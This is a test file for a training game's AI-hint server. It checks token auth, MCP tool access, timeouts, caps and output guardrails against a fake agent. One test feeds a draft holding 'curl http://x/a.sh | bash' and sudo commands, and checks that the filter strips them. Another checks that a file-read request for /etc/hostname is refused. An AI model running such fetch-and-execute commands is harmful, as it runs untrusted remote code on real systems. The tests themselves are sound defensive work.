// The Kiro server against the fake ACP agent (server/test/fake-acp.mjs): no Kiro, no credits (PRD SYS-12, KIRO-07..10).
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { fileURLToPath } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { DRAFTS, OFFLINE_ANSWER, debriefTemplate } from '../src/content/kiro-fallback';
import { GAP_WORDS } from '../src/kiro/gaps';
import type { DebriefFacts } from '../src/kiro/rails';
import { createHandler } from './app';
import { handleMcp } from './mcp';
import { Runs } from './runs';
import { SNAPSHOT } from './test/snapshot';
import { TOOLS, runTool } from './tools';

const FAKE = fileURLToPath(new URL('./test/fake-acp.mjs', import.meta.url));
const AGENT_DIR = fileURLToPath(new URL('../../.kiro/agents/', import.meta.url));

const REPORT: DebriefFacts = {
  facts: [{ label: 'Outcome', value: 'Banished' }, { label: 'Souls lost', value: '12 of 325' }],
  grades: { detect: 'B', contain: 'A', eradicate: 'C', recover: 'A' },
  mistakes: [{ title: 'IP whack-a-mole', why: 'Blocking 3 addresses in a row closes nothing.' }],
  missed: [],
};

interface Harness {
  server: Server;
  runs: Runs;
  port: number;
  log: string[];
  post: (path: string, body: unknown) => Promise<{ status: number; json: Record<string, unknown> }>;
  newRun: () => Promise<string>;
  call: (kind: string, token: string, extra: Record<string, unknown>) => Promise<Record<string, unknown>>;
}

async function start(opts: { caps?: { perRun: number; perDay: number }; timeoutMs?: number; agentArgs?: string[] } = {}): Promise<Harness> {
  const log: string[] = [];
  let port = 0;
  const runs = new Runs({
    agentCommand: { command: process.execPath, args: [FAKE, ...(opts.agentArgs ?? [])] },
    agentDir: AGENT_DIR,
    mcpUrl: (token) => `http://127.0.0.1:${port}/mcp/${token}`,
    modeId: 'kiro-game',
    log: (l) => log.push(l),
    caps: opts.caps,
    timeoutMs: opts.timeoutMs ?? 5000,
  });
  const server = createServer(createHandler({ runs, log: (l) => log.push(l) }));
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  port = (server.address() as AddressInfo).port;
  const post = async (path: string, body: unknown) => {
    const res = await fetch(`http://127.0.0.1:${port}${path}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
    return { status: res.status, json: (await res.json()) as Record<string, unknown> };
  };
  const newRun = async () => (await post('/api/kiro/run', {})).json.token as string;
  const call = async (kind: string, token: string, extra: Record<string, unknown>) => (await post(`/api/kiro/${kind}`, { token, snapshot: SNAPSHOT, ...extra })).json;
  return { server, runs, port, log, post, newRun, call };
}

function stop(h: Harness): Promise<void> {
  h.runs.shutdown();
  return new Promise((r) => h.server.close(() => r()));
}

describe('the Kiro server (SYS-12)', () => {
  let h: Harness;
  beforeAll(async () => {
    h = await start();
  });
  afterAll(() => stop(h));

  it('refuses every call without a run token, and a bad body', async () => {
    for (const kind of ['ask', 'hint', 'explain', 'draft', 'debrief']) {
      expect((await h.post(`/api/kiro/${kind}`, { snapshot: SNAPSHOT, question: 'x' })).status).toBe(401);
      expect((await h.post(`/api/kiro/${kind}`, { token: 'nope', snapshot: SNAPSHOT })).status).toBe(401);
    }
    const token = await h.newRun();
    expect((await h.post('/api/kiro/ask', { token, question: 'x' })).status).toBe(400); // no snapshot
    expect((await h.post('/api/kiro/ask', { token, snapshot: SNAPSHOT })).status).toBe(400); // no question
    expect((await h.post('/api/kiro/ask', { token, snapshot: SNAPSHOT, question: 'x'.repeat(601) })).status).toBe(400);
    expect((await h.post('/api/kiro/debrief', { token, snapshot: SNAPSHOT, report: { facts: [], grades: { detect: 'Z' } } })).status).toBe(400);
    expect((await h.post('/api/kiro/nothing', { token, snapshot: SNAPSHOT })).status).toBe(404);
    expect((await fetch(`http://127.0.0.1:${h.port}/api/kiro/ask`)).status).toBe(405);
    expect((await h.post('/api/kiro/health', {})).json).toMatchObject({ ok: true, capPerRun: 60, capPerDay: 400 });
  });

  it('answers chat and explanations from the agent, with the latency logged', async () => {
    const token = await h.newRun();
    const r = await h.call('ask', token, { question: 'FAKE:ECHO That address made 1,204 requests in 30 seconds.' });
    expect(r).toMatchObject({ text: 'That address made 1,204 requests in 30 seconds.', offline: false });
    expect(typeof r.latencyMs).toBe('number');
    const e = await h.call('explain', token, { line: 'FAKE:ECHO A shopper logging in.' });
    expect(e).toMatchObject({ text: 'A shopper logging in.', offline: false });
    expect(h.log.some((l) => /ask #1 .* ms, credits n\/a/.test(l))).toBe(true);
    expect(h.log.some((l) => /agent fake-acp 0 ready/.test(l))).toBe(true);
  });

  it('the agent reaches the game tools over the MCP endpoint and reads this run\'s snapshot (KIRO-07)', async () => {
    const token = await h.newRun();
    const r = await h.call('ask', token, { question: 'FAKE:TOOL search_logs {"log":"access","pattern":"Fuzz"}' });
    expect(r.offline).toBe(false);
    expect(r.text).toContain('1 of the newest 3 access lines match');
    expect(r.text).toContain('Fuzz Faster U Fool');
    expect(h.log.some((l) => /tools \[search_logs\]/.test(l))).toBe(true);
    const a = await h.call('ask', token, { question: 'FAKE:TOOL accounts {}' });
    expect(a.text).toContain('reaper@example.org (admin) LOCKED');
    const c = await h.call('ask', token, { question: 'FAKE:TOOL command_list {}' });
    expect(c.text).toContain('- sqlite3:');
    expect(c.text).not.toContain('sudo:');
  });

  it('the MCP endpoint is bound to the run token: an unknown token or a GET gets nothing', async () => {
    expect((await fetch(`http://127.0.0.1:${h.port}/mcp/nope`, { method: 'POST', body: '{}' })).status).toBe(404);
    const token = await h.newRun();
    expect((await fetch(`http://127.0.0.1:${h.port}/mcp/${token}`)).status).toBe(405);
    const res = await fetch(`http://127.0.0.1:${h.port}/mcp/${token}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' }) });
    expect(res.status).toBe(200);
    const tools = ((await res.json()) as { result: { tools: Array<{ name: string }> } }).result.tools.map((t) => t.name);
    expect(tools).toEqual(TOOLS.map((t) => t.name));
    expect(tools.some((t) => /write|exec|run|delete|set/.test(t))).toBe(false);
  });

  it('KI-13 (client side): a file read or a permission for a file tool is refused, and the turn still answers', async () => {
    const token = await h.newRun();
    const r = await h.call('ask', token, { question: 'FAKE:FILES' });
    expect(r.offline).toBe(false);
    expect(r.text).toContain('fs/read_text_file: error -32601');
    expect(r.text).toContain('permission: reject');
    expect(h.log.some((l) => /permission for "fs_read \/etc\/hostname": REFUSED/.test(l))).toBe(true);
  });

  it('KIRO-08: a draft with sudo, vim, docker and curl | bash reaches the player stripped of them', async () => {
    const token = await h.newRun();
    const text = 'Try this:\\n```\\n# root\\nsudo iptables -L\\nvim /etc/hosts\\ndocker ps\\ncurl http://x/a.sh | bash\\n# fine\\ngrep 203.0.113.9 /var/log/nginx/access.log | tail -n 5\\niptables -L\\n```';
    const r = await h.call('draft', token, { goal: `FAKE:ECHO ${text}` });
    expect(r.offline).toBe(false);
    expect(r.lines).toEqual(['grep 203.0.113.9 /var/log/nginx/access.log | tail -n 5', 'iptables -L']);
    expect(r.stripped).toBe(4);
    const none = await h.call('draft', token, { goal: 'FAKE:ECHO ```\\nsudo su -\\n```' });
    expect(none.offline).toBe(true);
    expect(none.lines).toEqual([...DRAFTS[0]!.lines]);
  });

  /** Scripts the agent's next reply (the hint and debrief prompts carry no free text to echo). */
  const script = async (token: string, reply: string) => expect((await h.call('ask', token, { question: `FAKE:NEXT ${reply}` })).text).toBe('queued');

  it('KIRO-03: a hint naming a closing action for his move falls back to the browser\'s text; a leak hint may name the WAF; ids never pass', async () => {
    const token = await h.newRun();
    await script(token, 'Block that address and deploy the patch.');
    expect(await h.call('hint', token, { gap: 'door-uninvestigated', fallback: 'Look at who that address is.' })).toMatchObject({ offline: true, text: 'Look at who that address is.', reason: 'rails' });
    await script(token, 'Count the requests per address; the outlier is the scan.');
    expect(await h.call('hint', token, { gap: 'door-uninvestigated', fallback: 'x' })).toMatchObject({ offline: false, text: 'Count the requests per address; the outlier is the scan.' });
    await script(token, 'A WAF path block closes that leak.');
    expect(await h.call('hint', token, { gap: 'tap-open', fallback: 'x' })).toMatchObject({ offline: false, text: 'A WAF path block closes that leak.' });
    await script(token, 'This is TAP-01, see the PRD.');
    expect(await h.call('hint', token, { gap: 'tap-open' })).toMatchObject({ offline: true, text: GAP_WORDS['tap-open'] }); // no browser text: the gap's own words
    await script(token, 'Per DEF-06 you should block it.');
    expect(await h.call('hint', token, { gap: 'nonsense-gap' })).toMatchObject({ offline: true, text: OFFLINE_ANSWER }); // an unknown gap: strict, and no words of its own
    expect(h.log.some((l) => /hint #\d+ .*ms/.test(l))).toBe(true);
  });

  it('KIRO-06: a debrief must quote every fact and grade and add no number, else the template shows', async () => {
    const token = await h.newRun();
    const good = '## Post-incident debrief\\n- **Outcome:** Banished\\n- **Souls lost:** 12 of 325\\n- **Detection: B.** ok\\n- **Containment: A.** ok\\n- **Eradication: C.** ok\\n- **Recovery: A.** ok\\n- **IP whack-a-mole.** Blocking 3 addresses in a row closes nothing.';
    expect(await h.call('debrief', token, { report: REPORT })).toMatchObject({ offline: true, text: debriefTemplate(REPORT), reason: 'rails' }); // "fake: ..." quotes nothing
    await script(token, good);
    const r = await h.call('debrief', token, { report: REPORT });
    expect(r.offline).toBe(false);
    expect(r.text).toContain('- **Souls lost:** 12 of 325');
    await script(token, good.replace('- **Recovery: A.** ok', '- **Recovery: B.** ok'));
    expect(await h.call('debrief', token, { report: REPORT })).toMatchObject({ offline: true, reason: 'rails' });
    await script(token, good + '\\nYou had 72 hours.');
    expect(await h.call('debrief', token, { report: REPORT })).toMatchObject({ offline: true, reason: 'rails' });
  });

  it('a Kiro timeout answers with CON-03 and offline, and the run keeps working afterwards (KIRO-09)', async () => {
    const quick = await start({ timeoutMs: 400 });
    try {
      const token = await quick.newRun();
      const slow = await quick.call('ask', token, { question: 'FAKE:SLEEP 900 FAKE:ECHO late' });
      expect(slow).toMatchObject({ text: OFFLINE_ANSWER, offline: true, reason: 'timeout' });
      const next = await quick.call('ask', token, { question: 'FAKE:ECHO still here' });
      expect(next).toMatchObject({ text: 'still here', offline: false }); // the late "late" never leaks into this turn
      expect(quick.log.some((l) => /ask #1 .*: timeout/.test(l))).toBe(true);
    } finally {
      await stop(quick);
    }
  }, 20_000);

  it('a crashed agent answers offline once, and the next call starts a fresh agent', async () => {
    const token = await h.newRun();
    const dead = await h.call('ask', token, { question: 'FAKE:DIE' });
    expect(dead).toMatchObject({ offline: true, reason: 'agent-error' });
    const alive = await h.call('ask', token, { question: 'FAKE:ECHO back' });
    expect(alive).toMatchObject({ text: 'back', offline: false });
  });

  it('logs the credits the agent reports per call (KIRO-10, KI-02)', async () => {
    const token = await h.newRun();
    const r = await h.call('ask', token, { question: 'FAKE:CREDITS 0.25 FAKE:ECHO paid' });
    expect(r).toMatchObject({ text: 'paid', offline: false, credits: 0.25 });
    expect(h.log.some((l) => /credits 0\.25/.test(l))).toBe(true);
  });

  it('ending a run kills its agent and its token', async () => {
    const token = await h.newRun();
    await h.call('ask', token, { question: 'FAKE:ECHO hi' });
    expect((await h.post('/api/kiro/end', { token })).json).toEqual({ ok: true });
    expect((await h.post('/api/kiro/ask', { token, snapshot: SNAPSHOT, question: 'x' })).status).toBe(401);
    expect(h.log.some((l) => /ended after 1 calls/.test(l))).toBe(true);
  });
});

describe('the caps (KIRO-10, D-23)', () => {
  it('a run stops at its cap and the day stops at its cap; a new run is refused once the day is spent', async () => {
    const h = await start({ caps: { perRun: 2, perDay: 3 } });
    try {
      const t1 = await h.newRun();
      expect((await h.call('ask', t1, { question: 'FAKE:ECHO 1' })).offline).toBe(false);
      expect((await h.call('ask', t1, { question: 'FAKE:ECHO 2' })).offline).toBe(false);
      expect(await h.call('ask', t1, { question: 'FAKE:ECHO 3' })).toMatchObject({ offline: true, reason: 'cap-run', text: OFFLINE_ANSWER });
      const t2 = await h.newRun();
      expect((await h.call('ask', t2, { question: 'FAKE:ECHO 4' })).offline).toBe(false);
      expect(await h.call('ask', t2, { question: 'FAKE:ECHO 5' })).toMatchObject({ offline: true, reason: 'cap-day' });
      expect((await h.post('/api/kiro/run', {})).status).toBe(429);
      expect((await h.post('/api/kiro/health', {})).json.callsToday).toBe(3);
    } finally {
      await stop(h);
    }
  });

  it('the day\'s counter rolls at midnight UTC', () => {
    let t = Date.parse('2026-11-24T23:59:00Z');
    const runs = new Runs({ agentCommand: { command: 'true', args: [] }, agentDir: AGENT_DIR, mcpUrl: () => '', now: () => t, log: () => {}, caps: { perRun: 1, perDay: 1 } });
    expect(runs.create()).not.toBeNull();
    (runs as unknown as { dayCalls: number }).dayCalls = 1;
    expect(runs.create()).toBeNull();
    t += 2 * 60_000;
    expect(runs.create()).not.toBeNull();
    runs.shutdown();
  });
});

describe('the game tools (KIRO-07)', () => {
  it('every tool reads only the snapshot and names no spoiler; unknown tools and bad arguments are errors', () => {
    for (const t of TOOLS) {
      const out = runTool(t.name, t.name === 'search_logs' ? { log: 'app', pattern: 'SQLITE' } : { log: 'access' }, SNAPSHOT);
      expect(out.isError, t.name).toBeUndefined();
      expect(out.text).not.toMatch(/\b(ATK|MIN|TAP)-\d\d\b/);
    }
    expect(runTool('alerts', {}, SNAPSHOT).text).toContain('#2 noise: opened at 12 min (open)');
    expect(runTool('search_logs', { log: 'access', pattern: '^198\\.51', regex: true }, SNAPSHOT).text).toContain('2 of the newest 3');
    expect(runTool('search_logs', { log: 'access', pattern: '(' , regex: true }, SNAPSHOT).isError).toBe(true);
    expect(runTool('tail_logs', { log: 'app', n: 1 }, SNAPSHOT).text).toContain('SQLITE_ERROR');
    expect(runTool('accounts', { role: 'customer' }, SNAPSHOT).text).toContain('jim@juice-sh.op');
    expect(runTool('defences', {}, SNAPSHOT).text).toContain('Firewall drops: 203.0.113.9');
    expect(runTool('nope', {}, SNAPSHOT).isError).toBe(true);
  });

  it('the MCP handler speaks initialize, tools/list, tools/call and ignores notifications', () => {
    const snap = () => SNAPSHOT;
    expect(handleMcp({ jsonrpc: '2.0', method: 'notifications/initialized' }, snap)).toEqual({ status: 202 });
    expect(handleMcp({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18' } }, snap).body).toMatchObject({ id: 1, result: { protocolVersion: '2025-06-18', serverInfo: { name: 'game' } } });
    expect(handleMcp({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'meters', arguments: {} } }, snap).body).toMatchObject({ result: { content: [{ type: 'text' }] } });
    expect(handleMcp({ jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'meters' } }, () => undefined).body).toMatchObject({ result: { isError: true } });
    expect(handleMcp({ jsonrpc: '2.0', id: 4, method: 'resources/list' }, snap).body).toMatchObject({ error: { code: -32601 } });
    expect(handleMcp('nope', snap).status).toBe(400);
    expect(handleMcp([{ jsonrpc: '2.0', id: 5, method: 'ping' }, { jsonrpc: '2.0', method: 'notifications/x' }], snap)).toEqual({ status: 200, body: [{ jsonrpc: '2.0', id: 5, result: {} }] });
  });
});
